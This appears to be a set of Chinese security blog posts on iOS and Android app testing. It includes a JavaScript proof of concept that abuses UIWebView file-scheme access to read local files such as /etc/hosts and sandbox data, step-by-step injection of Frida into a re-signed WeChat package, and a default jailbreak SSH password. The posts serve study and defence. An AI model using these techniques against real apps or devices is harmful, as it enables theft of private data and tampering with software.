    <content type="text"><![CDATA[WebView是iOS用于显示网页的控件，是一个基于Webkit引擎、展现web页面的控件。WebView控件功能除了具有一般View的属性和设置外，还可对URL请求、页面加载、渲染、页面交互进行处理。 iOS下的Webview有UIWebView和WKWebView两种，其中UIWebView在iOS 8之后已经不推荐使用（https://developer.apple.com/documentation/uikit/uiwebview?changes=_6）,但仍然有很多APP使用UIWebView。 File跨域漏洞UIWebView 此漏洞默认存在， WKWebView如果使用了不恰当的方式比如 [configuration.preferences setValue:@”TRUE” forKey:@”allowFileAccessFromFileURLs”]; 也会存在漏洞 攻击者可利用App文件下载机制将恶意文件写入沙盒内并诱导用户打开，当用户打开恶意文件时，其中的恶意代码可通过AJAX向“file://”域发起请求，从而远程获取App沙盒内所有的本地敏感数据。 UIWebViewUIWebView虽然已经被遗弃，但依然还有很多app继续使用，且最新版本的iOS也会兼容UIWebView。由于UIWebView本身存在严重的跨域漏洞，所以只要使用UIWebView都有可能存在跨域漏洞。 漏洞原因在于UIWebView的WebKitAllowUniversalAccessFromFileURLs和WebKitAllowFileAccessFromFileURLs默认开启，导致通过js可以访问沙箱内的文件，甚至可以静默上传文件到远端。 漏洞代码示例：123456789UIWebView* uiweb = [[UIWebView alloc] initWithFrame:self.view.frame];uiweb.center = self.view.center;// 打开本地html文件NSString *resourcePath = [[NSBundle mainBundle] resourcePath];NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;];NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil];NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]];[uiweb loadHTMLString:htmlstring baseURL:baseUrl];[self.view addSubview:uiweb]; PoC代码如下：12345678910111213141516var localfile = &quot;file:///etc/hosts&quot;var xhr = new XMLHttpRequest();xhr.onreadystatechange=function() &#123; if (xhr.readyState==4) &#123; alert(xhr.responseText); &#125; &#125; try &#123; xhr.open(&quot;GET&quot;, localfile, true); xhr.send(); &#125; catch (ex) &#123; alert(ex.message); &#125; 被攻击者点击打开文件后，应用默认使用UIWebView进行加载，结果如下图： 如果将localfile设置为”/User/Media/DCIM/100APPLE/xxx.JPG”即可以打开本地照片，设置成相对路径即可打开沙盒内的任意文件。 修复方式是使用WKWebView替换UIWebView，并做好配置，因为WKWebView也不是绝对安全。 WKWebViewWKWebView默认allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs选项为false，但如果开发者开启了这两个API，同样存在跨域漏洞。 需要注意的是allowFileAccessFromFileURLs和allowUniversalAccessFromFileURLs任意一个API设置为true，都会存在漏洞。另外，在OC中两个API的调用不同且均为私有API，详见以下代码。 漏洞代码示例：1234567891011121314//配置WKWebView设置allowFileAccessFromFileURLs 为true WKWebViewConfiguration * configuration = [[WKWebViewConfiguration alloc] init]; //[configuration.preferences setValue:@TRUE forKey:@&quot;allowFileAccessFromFileURLs&quot;]; [configuration setValue:@TRUE forKey:@&quot;allowUniversalAccessFromFileURLs&quot;]; WKWebView *wkweb = [[WKWebView alloc] initWithFrame:self.view.frame configuration:configuration]; wkweb.center = self.view.center; wkweb.UIDelegate = self;//代理，需要实现alert [self.view addSubview:wkweb]; NSString *resourcePath = [[NSBundle mainBundle] resourcePath]; NSString *filePath =[resourcePath stringByAppendingPathComponent:@&quot;index.html&quot;]; NSMutableString *htmlstring=[[NSMutableString alloc] initWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil]; NSURL *baseUrl=[NSURL fileURLWithPath:[[NSBundle mainBundle] bundlePath]]; [wkweb loadHTMLString:htmlstring baseURL:baseUrl]; 开启API后执行结果如下： 参考资料： CNNVD 关于iOS平台WebView组件跨域漏洞情况的通报 https://mp.weixin.qq.com/s/ZBMCgoQnYIUHVjrUHOlv4g https://bugs.webkit.org/show_bug.cgi?id=154916 https://developer.apple.com/documentation/webkit/wkwebview OC和js的相互调用OC调用jsUIWebView 1.stringByEvaluatingJavaScriptFromString该方法不能判断调用了一个js方法之后，是否发生了错误。当错误发生时，返回值为nil，而当调用一个方法本身没有返回值时，返回值也为nil，所以无法判断是否调用成功了。 1234 NSString *str = [uiweb stringByEvaluatingJavaScriptFromString:@&quot;document.location.href=&apos;https://www.baidu.com&apos;;&quot; &quot;document.title=&apos;test&apos;;&quot;&quot;setTimeout(document.write(&apos;aaaa&apos;),9000);&quot;]; NSLog(@&quot;%@&quot;,str); 2.JavaScriptCore（iOS 7.0 +）WebKit有一个内嵌的js环境，一般我们在页面加载完成之后，获取js上下文，然后通过JSContext的evaluateScript:方法来获取返回值。因为该方法得到的是一个JSValue对象，所以支持JavaScript的Array、Number、String、对象等数据类型。 123JSContext *jsContext = [uiwebView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;];JSValue *value = [jsContext evaluateScript:@&quot;document.write(&apos;http://www.qq.com&apos;)&quot;];NSLog(@&quot;%@&quot;,value.toString); WKWebViewWKWebView提供了一个evaluateJavaScript的方法1-(void)evaluateJavaScript:(NSString *)javaScriptString completionHandler:(void (^ _Nullable)(_Nullable id result, NSError * _Nullable error))completionHandler; 实例代码如下：123[self.webView evaluateJavaScript:@&quot;document.title&quot; completionHandler:^(id _Nullable title, NSError * _Nullable error) &#123; NSLog(@&quot;调用evaluateJavaScript异步获取title：%@&quot;, title);&#125;]; js调用OCUIWebView 拦截自定义scheme 比如m4bln://。方法是在html或者js中，点击某个按钮触发事件时，跳转到自定义URL Scheme构成的链接，而OC中捕获该链接，从中解析必要的参数，实现JS到OC的一次交互。比如页面中一个a标签，链接如下：1&lt;a href=&quot;m4bln://login?aaa=xxx&quot;&gt; OC代码实现如下：123456789101112-(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType&#123; //标准的URL包含scheme、host、port、path、query、fragment等 NSURL *URL = request.URL; if ([URL.scheme isEqualToString:@&quot;m4bln&quot;]) &#123; if ([URL.host isEqualToString:@&quot;login&quot;]) &#123; NSLog(@&quot;js参数为 %@&quot;, URL.query); return NO; &#125; &#125; return YES;&#125; 2.JavaScriptCore（iOS 7.0 +） 利用JavaScriptCore，在页面加载完成时，先获取js上下文。获取到之后，我们就可以进行强大的方法映射了。例如，前端调用share方法：12function share(title, imgUrl, link) &#123;&#125; 对应的OC代码为： 12345678910111213141516171819202122-(void)webViewDidFinishLoad:(UIWebView *)webView&#123; //获取该UIWebview的javascript上下文 //self持有jsContext //@property (nonatomic, strong) JSContext *jsContext; self.jsContext = [self.webView valueForKeyPath:@&quot;documentView.webView.mainFrame.javaScriptContext&quot;]; //js调用oc //其中share就是js的方法名称，赋给是一个block 里面是oc代码 //此方法最终将打印出所有接收到的参数，js参数是不固定的 self.jsContext[@&quot;share&quot;] = ^() &#123; NSArray *args = [JSContext currentArguments];//获取到share里的所有参数 //args中的元素是JSValue，需要转成OC的对象 NSMutableArray *messages = [NSMutableArray array]; for (JSValue *obj in args) &#123; [messages addObject:[obj toObject]]; &#125; NSLog(@&quot;点击分享js传回的参数：\n%@&quot;, messages); &#125;;&#125; WKWebView 1.拦截自定义scheme 12345678910111213141516-(void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler &#123; //可以通过navigationAction.navigationType获取跳转类型，如新链接、后退等 NSURL *URL = navigationAction.request.URL; //判断URL是否符合自定义的URL Scheme if ([URL.scheme isEqualToString:@&quot;darkangel&quot;]) &#123; //根据不同的业务，来执行对应的操作，且获取参数 if ([URL.host isEqualToString:@&quot;smsLogin&quot;]) &#123; NSString *param = URL.query; NSLog(@&quot;短信验证码登录, 参数为%@&quot;, param); decisionHandler(WKNavigationActionPolicyCancel); return; &#125; &#125; decisionHandler(WKNavigationActionPolicyAllow); NSLog(@&quot;%@&quot;, NSStringFromSelector(_cmd));&#125; 2.scriptMessageHandler (1) 创建WKWebViewConfiguration对象，配置各个API对应的MessageHandler。(2) 创建WKWebView。(3) 实现协议方法。1234567891011121314151617181920212223242526//首先别忘了，在configuration中的userContentController中添加scriptMessageHandler[controller addScriptMessageHandler:self name:@&quot;shareNew&quot;]; //记得适当时候remove//点击a标签时，则会调用下面的方法#pragma mark - WKScriptMessageHandler -(void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message &#123; if ([message.name isEqualToString:@&quot;shareNew&quot;]) &#123; NSDictionary *shareData = message.body; NSLog(@&quot;shareNew分享的数据为： %@&quot;, shareData); //模拟异步回调 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^&#123; //读取js function的字符串 NSString *jsFunctionString = shareData[@&quot;result&quot;]; //拼接调用该方法的js字符串 NSString *callbackJs = [NSString stringWithFormat:@&quot;(%@)(%d);&quot;, jsFunctionString, NO]; //后面的参数NO为模拟分享失败 //执行回调 [self.webView evaluateJavaScript:callbackJs completionHandler:^(id _Nullable result, NSError * _Nullable error) &#123; if (!error) &#123; NSLog(@&quot;模拟回调，分享失败&quot;); &#125; &#125;]; &#125;); &#125;&#125; 参考链接： iOS中UIWebView与WKWebView、JavaScript与OC交互 https://www.jianshu.com/p/ac45d99cf912]]></content>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全 —— MonkeyDev的使用]]></title>
    <url>%2F2018%2F06%2F19%2FiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-MonkeyDev%2F</url>
    <content type="text"><![CDATA[概述MonkeyDev的功能主要如下： 可以使用Xcode开发CaptainHook Tweak、Logos Tweak 和 Command-line Tool，在越狱机器开发插件，这是原来iOSOpenDev功能的迁移和改进。 只需拖入一个砸壳应用，自动集成class-dump、restore-symbol、Reveal、Cycript和注入的动态库并重签名安装到非越狱机器。 支持调试自己编写的动态库和第三方App 支持通过CocoaPods第三方应用集成SDK以及非越狱插件，简单来说就是通过CocoaPods搭建了一个非越狱插件商店。 MonkeyDev wiki: https://github.com/AloneMonkey/MonkeyDev/wiki 安装 安装最新的theos 1sudo git clone --recursive https://github.com/theos/theos.git /opt/theos 安装ldid 1brew install ldid 安装MonkeyDev 1sudo /bin/sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)&quot; 更新MonkeyDev1sudo /bin/sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-update)&quot; 参考https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85 使用安装完成之后，打开Xcode，新建一个项目，滑动到最下方可以看到MonkeyDev提供的模块: 非越狱下注入Frida1.准备好砸壳后的app从pp助手、iphonecake等下载砸壳后的应用，也可以在其他越狱的手机上砸壳 2.创建MonkeyApp项目新建一个MonkeyApp项目，然后填写Product Name，对于非越狱设备可以不用管Target App，如果是越狱设备的话可以在Target App填写目标App的名字或者bundle id，工具将会自动使用frida-ios-dump提取ipa文件 这里创建的项目是monkeydev_test,得到如下结构： monkeydev_testDylib这个是将被注入目标App的动态库，自己要hook的代码可以在monkeydev_testDylib.m文件里面写，默认项目写了一些Demo代码，支持OC runtime的HOOK，C函数的fishhook。还支持theos logtweak的写法！ 直接写在monkeydev_testDylib.m文件文件即可。 Config 这个是cycript的一些脚本下载以及methodtrace配置代码。 LLDBTools 这个是用于LLDB调试的代码，比如po pviews()。 AntiAntiDebug 这个里面是反反调试的代码。 fishhook 这个是自动集成的fishhook模块。 创建的项目已经自动集成了RevealServer.framework和libcycript.dylib，如果选择Release编译的话是不会集成的。 3.拖入编译(1) 右键项目里面的TargetApp文件夹Show in Finder，把ipa文件拖入下面的位置(当然app文件夹也可以的): (2) 从FridaGadget.dylib下载动态库增加到App最后的Copy Files里面: (3) 将FridaGadget.dylib链接到MonkeyDev注入动态库的依赖里面 编译后运行app, 如果启动日志有: Frida: Listening on 127.0.0.1 TCP port 27042 就集成成功：]]></content>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全 —— 非越狱下使用Frida]]></title>
    <url>%2F2018%2F06%2F18%2FiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E2%80%94%E2%80%94-%E9%9D%9E%E8%B6%8A%E7%8B%B1%E4%B8%8B%E4%BD%BF%E7%94%A8Frida%2F</url>
    <content type="text"><![CDATA[概述frida-server在运行时需要root环境，但如果没有越狱的设备，依然可以使用frida,我们只需要重打包ipa文件，将frida运行库注入ipa文件中，app在启动时会自动加载frida运行库，即可实现在非越狱的设备上使用Frida. 由于苹果的混淆策略和代码签名，重打包app的难度很高，一些自动重打包的工具如Objection、IPAPatch等简化了重打包过程，但其本质大概相同，以下分步介绍手动重打包frida运行库的过程。 1. 配置optool和ios-deployoptool可以将一个外部的lib插入到Mach-O文件头，使binary文件在启动时会自动加载该lib。如已经配置过，直接跳过。12345$ git clone https://github.com/alexzielenski/optool.git$ cd optool/$ git submodule update --init --recursive$ xcodebuild$ ln -s &lt;your-path-to-optool&gt;/build/Release/optool /usr/local/bin/optool ios-deploy可以在不用Xcode的前提下调试和部署APP:123456$ git clone https://github.com/phonegap/ios-deploy.git$ cd ios-deploy/$ xcodebuild$ cd build/Release$ ./ios-deploy$ ln -s &lt;your-path-to-ios-deploy&gt;/build/Release/ios-deploy /usr/local/bin/ios-deploy 更新bashrc文件12zsh: # . ~/.zshrcbash: # . ~/.bashrc 2.准备FridaGadget.dylibFridaGadget.dylib会不断更新，历史版本在https://github.com/frida/frida/releases中下载1curl -O https://build.frida.re/frida/ios/lib/FridaGadget.dylib 3.重打包1.解压ipa文件(ipa必须为砸壳后的文件)，复制FridaGadget.dylib到app目录，使用optool添加到binary文件123456789101112unzip wechat.ipa$ cp FridaGadget.dylib Payload/WeChat.app/$ optool install -c load -p &quot;@executable_path/FridaGadget.dylib&quot; -t Payload/WeChat.app/WeChatFound FAT HeaderFound thin header...Found thin header...Inserting a LC_LOAD_DYLIB command for architecture: armSuccessfully inserted a LC_LOAD_DYLIB command for armInserting a LC_LOAD_DYLIB command for architecture: arm64Successfully inserted a LC_LOAD_DYLIB command for arm64Writing executable to Payload/WeChat.app/WeChat... 2.替换provisioning profile文件由于在binary中注入了frida，破坏了原有的代码签名，无法在iOS设备上运行，因此需要重新签名。首先，添加自己的provisioning profile文件。 自己的provisioning profile可以通过新建一个xcode工程，(provisioning profile有效期为7天，所以每次尽量新建一个空的工程，并在设备上运行)从.app文件中提取，路径为~/Library/Developer/Xcode/DerivedData/xxxxxxx/Build/Products/Debug-iphoneos/xxxxxxx.app/。或者通过xcode界面定位到.app文件: 打开Xcode，创建一个SimpleViewApp 运行环境选中你的设备，运行一次 选中左边导航栏Products中的app 点击最右面板中，Full Path右下角的箭头，定位到app所在的目录 右击app选择“显示包内容”，即可看到embedded.mobileprovision 对于获取到的provisioning profile，可以用security命令验证是否正确。除了检查允许的证书、设备外，entitlements文件在代码签名中也会用到，所以需要把其提取为一个单独的plist文件：12345678910111213141516171819$ security cms -D -i AwesomeRepackaging.mobileprovision &gt; profile.plist$ /usr/libexec/PlistBuddy -x -c &apos;Print :Entitlements&apos; profile.plist &gt; entitlements.plist$ cat entitlements.plist&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;dict&gt; &lt;key&gt;application-identifier&lt;/key&gt; &lt;string&gt;LRUD9L355Y.sg.vantagepoint.repackage&lt;/string&gt; &lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt; &lt;string&gt;LRUD9L355Y&lt;/string&gt; &lt;key&gt;get-task-allow&lt;/key&gt; &lt;true/&gt; &lt;key&gt;keychain-access-groups&lt;/key&gt; &lt;array&gt; &lt;string&gt;LRUD9L355Y.*&lt;/string&gt; &lt;/array&gt;&lt;/dict&gt;&lt;/plist&gt; 需要注意的是： application identifier字段是由Team ID (LRUD9L355Y) 和Bundle ID (sg.vantagepoint.repackage)构成，Bundle ID必须和Info.plist的bundle id匹配 “get-task-allow”必须为true，否则其他进程无法attach 确定provisioning profile有效后，我们将其复制到工程目录下1$ cp my.mobileprovision Payload/WeChat.app/embedded.mobileprovision 更新Info.plist中的bundle ID：1$ /usr/libexec/PlistBuddy -c &quot;Set :CFBundleIdentifier m4bln.myapp&quot; Payload/WeChat.app/Info.plist 3.移除原有签名1$ rm -rf Payload/WeChat.app/_CodeSignature 4.重新签名对FridaGadget.dylib签名，其中的”8004380F331DCA22CC1B47FB1A805890AE41C938”需要替换为自己的哈希，可以通过“security find-identity -p codesigning -v”命令获取123$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 Payload/WeChat.app/FridaGadget.dylibPayload/WeChat.app/FridaGadget.dylib: replacing existing signature 使用entitlements.plist对binary文件进行签名：123$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/WeChat.app/WeChatPayload/WeChat.app/WeChat: replacing existing signature 安装和运行app使用ios-deploy安装和运行app1$ ios-deploy --debug --bundle Payload/WeChat.app/ 运行frida-ps -U验证是否可以attach：1234$ frida-ps -UPID Name--- ------499 Gadget 测试Frida运行一段frida脚本，实现在界面上弹窗:注： attach时需要根据frida-ps获得的进程pid设置attach参数 123456789101112131415161718192021222324252627282930313233343536373839import sysimport frida##JavaScript to be injectedfrida_code = &quot;&quot;&quot;// Defining a Block that will be passed as handler parameter to +[UIAlertAction actionWithTitle:style:handler:]var handler = new ObjC.Block(&#123; retType: &apos;void&apos;, argTypes: [&apos;object&apos;], implementation: function () &#123; &#125;&#125;);// Import ObjC classesvar UIAlertController = ObjC.classes.UIAlertController;var UIAlertAction = ObjC.classes.UIAlertAction;var UIApplication = ObjC.classes.UIApplication;// Using Grand Central Dispatch to pass messages (invoke methods) in application&apos;s main threadObjC.schedule(ObjC.mainQueue, function () &#123; // Using integer numerals for preferredStyle which is of type enum UIAlertControllerStyle var alert = UIAlertController.alertControllerWithTitle_message_preferredStyle_(&apos;Frida&apos;, &apos;Hello from Frida&apos;, 1); // Again using integer numeral for style parameter that is enum var defaultAction = UIAlertAction.actionWithTitle_style_handler_(&apos;OK&apos;, 0, handler); alert.addAction_(defaultAction); // Instead of using `ObjC.choose()` and looking for UIViewController instances // on the heap, we have direct access through UIApplication: UIApplication.sharedApplication().keyWindow().rootViewController().presentViewController_animated_completion_(alert, true, NULL);&#125;)&quot;&quot;&quot;process = frida.get_usb_device().attach(499)script = process.create_script(frida_code)#script.on(&apos;message&apos;, message_callback)script.load()sys.stdin.read() 运行截图如下： 参考文献： iOS App的Patching和Resigning https://www.jianshu.com/p/ce2770c42ead https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/ 如何重新打包并签名iOS应用 https://www.anquanke.com/post/id/152952]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android JsBridge]]></title>
    <url>%2F2018%2F06%2F11%2FAndroid-JsBridge%2F</url>
    <content type="text"><![CDATA[Android客户端中经常会遇到js调用java代码的场景，例如一些Hybrid APP或H5等，JsBridge即通过js调用java或者通过java调用js函数。 java调用js1. webview的loadUrl1WebView.loadUrl(&quot;javascript:function()&quot;); 2. webview的evaluateJavascript使用evaluateJavascript可以获得js函数的返回值123456mWebView.evaluateJavascript(&quot;javascript:callJS()&quot;, new ValueCallback&lt;String&gt;() &#123; @Override public void onReceiveValue(String value) &#123; //此处为 js 返回的结果 &#125;&#125;); js调用JavaAndroid中js调用java通常有以下几种做法： 1. 通过WebView的addJavascriptInterface（）进行对象映射定义一个与JS对象映射关系的Android类：AndroidtoJs,在Android里通过WebView设置Android类与JS代码的映射 java代码：123456789101112mWebView.addJavascriptInterface(new AndroidtoJs(), &quot;test&quot;);public class AndroidtoJs extends Object &#123; // 定义JS需要调用的方法 // 被JS调用的方法必须加入@JavascriptInterface注解 @JavascriptInterface public void hello(String msg) &#123; System.out.println(&quot;JS调用了Android的hello方法&quot;); &#125;&#125; js端代码：123456&lt;script&gt;function callAndroid()&#123; // 由于对象映射，所以调用test对象等于调用Android映射的对象 test.hello(&quot;js调用了android中的hello方法&quot;);&#125;&lt;/script&gt; 2. 通过 WebViewClient 的shouldOverrideUrlLoading ()方法回调拦截 url实现逻辑如下： Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url 解析该 url 的协议 如果检测到是预先约定好的协议，就调用相应方法 java端代码如下：1234567891011121314151617181920212223242526webview.setWebViewClient(new WebViewClient()&#123; @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) &#123; String url=&quot;&quot;; try&#123; if (Build.VERSION.SDK_INT &gt; 21) &#123; url = request.getUrl().toString(); &#125; if(url.startsWith(&quot;m4bln://&quot;))&#123; // 实现自己代码 Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url)); startActivity(intent); return true; &#125; &#125;catch (Exception e)&#123; return false; &#125; view.loadUrl(url); return true; &#125; &#125;); 触发shouldOverrideUrlLoading的代码参照《Web调起App》 3. 通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）、onConsoleMessage（）方法回调拦截JS对话框alert()、confirm()、prompt()、console.log()消息常用的拦截是：拦截 JS的输入框（即prompt（）方法）因为只有prompt（）可以返回任意类型的值，操作最全面方便、更加灵活；而alert（）对话框没有返回值；confirm（）对话框只能返回两种状态（确定 / 取消）两个值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mWebView.setWebChromeClient(new WebChromeClient() &#123; // 拦截输入框 // 参数message:代表promt（）的内容（不是url） // 参数result:代表输入框的返回值 @Override public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) &#123; // 根据协议的参数，判断是否是所需要的url(原理同方式2) // 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数） //假定传入进来的 url = &quot;js://webview?arg1=111&amp;arg2=222&quot;（同时也是约定好的需要拦截的） Uri uri = Uri.parse(message); // 如果url的协议 = 预先约定的 js 协议 // 就解析往下解析参数 if ( uri.getScheme().equals(&quot;js&quot;)) &#123; // 如果 authority = 预先约定协议里的 webview，即代表都符合约定的协议 // 所以拦截url,下面JS开始调用Android需要的方法 if (uri.getAuthority().equals(&quot;webview&quot;)) &#123; // // 执行JS所需要调用的逻辑 System.out.println(&quot;js调用了Android的方法&quot;); // 可以在协议上带有参数并传递到Android上 HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;(); Set&lt;String&gt; collection = uri.getQueryParameterNames(); //参数result:代表消息框的返回值(输入值) result.confirm(&quot;js调用了Android的方法成功啦&quot;); &#125; return true; &#125; return super.onJsPrompt(view, url, message, defaultValue, result);&#125; @Override public boolean onConsoleMessage(ConsoleMessage consoleMessage)&#123; String message = consoleMessage.message(); Toast.makeText(getBaseContext(),message,Toast.LENGTH_LONG).show(); return super.onConsoleMessage(consoleMessage); &#125; @Override public boolean onJsConfirm (WebView view,String url,String message,JsResult result)&#123; Toast.makeText(getBaseContext(),&quot;onJsConfirm m4bln&quot;,Toast.LENGTH_LONG).show(); return true; &#125; 几种方法对比 JsBridge接口封装 实现简单的注册接口 1JSBridge.register(&quot;ClassName&quot;,javaClass.class) 通过反射调用 1234567891011121314public static boolean callJavaMethod(String className, String methodName, Object... params) &#123; ...... Method method = classNameLists.get(methodName); ...... try &#123; method.invoke(null, params); return true; &#125; catch (IllegalAccessException e) &#123; e.printStackTrace(); &#125; catch (InvocationTargetException e) &#123; e.printStackTrace(); &#125; return false; &#125; 避免混淆 为了避免混淆时class名字改变，所有的类可以注册一个空接口12public interface IBridge&#123;&#125; 此时在混淆文件中加入以下代码，就可以12-keep public class * implements com.myapp.jsbridge.IBridge&#123;*;&#125;-keepclasseswithmembernames public class * implements com.myapp.jsbridge.IBridge&#123;*;&#125; 参考sdk https://github.com/lzyzsd/JsBridge （https://github.com/lzyzsd/JsBridge）]]></content>
  </entry>
  <entry>
    <title><![CDATA[iOS应用安全—— 基础篇]]></title>
    <url>%2F2018%2F05%2F31%2FiOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%EF%BC%88%E5%BE%85%EF%BC%89%2F</url>
    <content type="text"><![CDATA[越狱几种类型的越狱： Tethered jailbreaks 不完美越狱，重启后无法保留 Semi-tethered jailbreaks 半完美越狱，必须通过连接电脑越狱，设备启动后会自动进入非越狱模式 Semi-untethered jailbreaks 半完美越狱，设备启动能自己进入到越狱模式，但内核的代码签名校验不会被自动禁用，需要通过启动一个应用完成 Untethered jailbreaks 完美越狱，一次越狱后即可永久越狱 注意：如果设备已经越狱，切勿升级系统，否则会丢失越狱 根据iOS版本判断设备是否可以越狱：Can I Jailbreak? https://canijailbreak.com/ 几个iPhone越狱相关的资源： The iPhone Wiki Reddit Jailbreak Cydia通常在越狱完成后会自动安装Cydia，下面介绍几个在Cydia下需要安装的工具： openssh默认的ssh账号是root，默认密码为alpine Frida在Cydia中添加源 https://build.frida.re后直接搜索安装 BigBoss Recommended Toolsunix命令行工具，iOS系统不提供，如wget, unrar, less,sqlite3等 Class Dump提取Mach-O文件信息 SubstrateHook工具 AppList查询所有安装的app NeedleNeedle是iOS平台上的一套动态测试，由mwr开发，类似于Android平台上的Drozer,但因系统的不同而功能不一。 以下为mac上配置Needle的过程： 安装依赖 123456789101112131415161718192021#Core dependenciesbrew install pythonbrew install libxml2xcode-select --install#Python packagessudo -H pip install --upgrade --user readlinesudo -H pip install --upgrade --user paramikosudo -H pip install --upgrade --user sshtunnelsudo -H pip install --upgrade --user fridasudo -H pip install --upgrade --user biplist#sshpassbrew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb#mitmproxywget https://github.com/mitmproxy/mitmproxy/releases/download/v0.17.1/mitmproxy-0.17.1-osx.tar.gztar -xvzf mitmproxy-0.17.1-osx.tar.gzsudo cp mitmproxy-0.17.1-osx/mitm* /usr/local/bin/#Download sourcegit clone https://github.com/mwrlabs/needle.git 手机上安装needle代理Cydia添加源http://mobiletools.mwrinfosecurity.com/cydia/,搜索NeedleAgent安装即可 使用needle 1234567891011121314151617181920212223242526272829303132$ python needle.py __ _ _______ _______ ______ ______ | \ | |______ |______ | \ | |______ | \_| |______ |______ |_____/ |_____ |______ Needle v1.0 [mwr.to/needle] [MWR InfoSecurity (@MWRLabs) - Marco Lancini (@LanciniMarco)][needle] &gt; helpCommands (type [help|?] &lt;topic&gt;):---------------------------------back exit info kill pull reload search shell show useexec_command help jobs load push resource set shell_local unset[needle] &gt; show options Name Current Value Required Description ------------------------ ------------- -------- ----------- AGENT_PORT 4444 yes Port on which the Needle Agent is listening APP no Bundle ID of the target application (e.g., com.example.app). Leave empty to launch wizard DEBUG False yes Enable debugging output HIDE_SYSTEM_APPS False yes If set to True, only 3rd party apps will be shown IP 127.0.0.1 yes IP address of the testing device (set to localhost to use USB) OUTPUT_FOLDER /root/.needle/output yes Full path of the output folder, where to store the output of the modules PASSWORD ******** yes SSH Password of the testing device PORT 2222 yes Port of the SSH agent on the testing device (needs to be != 22 to use USB) PUB_KEY_AUTH True yes Use public key auth to authenticate to the device. Key must be present in the ssh-agent if a passphrase is used SAVE_HISTORY True yes Persists command history across sessions SKIP_OUTPUT_FOLDER_CHECK False no Skip the check that ensures the output folder does not already contain other files. It will automatically overwrite any file USERNAME root yes SSH Username of the testing device VERBOSE True yes Enable verbose output[needle] &gt; iOS目录结构OS X和iOS目录对比 系统目录 /Applications：存放所有的系统App和来自于Cydia的App，不包括StoreApp /Developer：如果一台设备连接Xcode后被指定为调试机，Xcode就会在iOS中生成该目录 /Developer/Applications /Developer/Library /Developer/Tools /Developer/usr /Library：存放一些提供系统支持的数据 /Library/MobileSubstrate/DynamicLibraries：存放Cydia安装程序的.plist和.dylib文件 /System/Library：iOS文件系统中最重要的目录之一，存放大量系统组件 /System/Library/Frameworks：存放iOS中各种日常使用的framework /System/Library/PrivateFrameworks：存放iOS中未公开的私有framework /System/Library/CoreServices/SpringBoard.app：iOS桌面管理器 /User：用户目录（mobile用户的home目录），实际指向/var/mobile，存放大量用户数据 - /var/mobile/Media/DCIM：存放照片 - /var/mobile/Media/Recording：存放录音文件 - /var/mobile/Library/SMS：存放短信数据库 - /var/mobile/Library/Mail：存放邮件数据 - /var/mobile/Containers：存放Apple Store的App。 - /var/mobile/Containers/Bundle：存放所有StoreApp的可执行文件和相关资源 - /var/mobile/Containers/Data：存放所有StoreApp的数据，沙盒目录的真实目录 应用沙盒iOS系统把每个应用（StoreApp）以及数据都放到一个沙盒（sandbox）里面，应用只能访问自己沙盒目录里面的文件、网络资源等（也有例外，比如系统通讯录、照相机、照片等能在用户授权的情况下被第三方应用访问） 应用沙盒目录结构如下图： 沙盒在逻辑上包含两个部分：Bundle Container和Data Container，两者在iOS文件系统中的位置是平行的，分别是/var/mobile/Containers/Bundle和/var/mobile/Containers/Data。 实际开发中，通过NSHomeDirectory()方法获取到沙盒根目录对应的是Data Container的路径。在越狱设备中可以通过ipainstaller工具获得app路径：123456789iPhone:~ root# ipainstaller -l...sg.vp.UnCrackable1iPhone:~ root# ipainstaller -i sg.vp.UnCrackable1...Bundle: /private/var/mobile/Containers/Bundle/Application/A8BD91A9-3C81-4674-A790-AF8CDCA8A2F1Application: /private/var/mobile/Containers/Bundle/Application/A8BD91A9-3C81-4674-A790-AF8CDCA8A2F1/UnCrackable Level 1.appData: 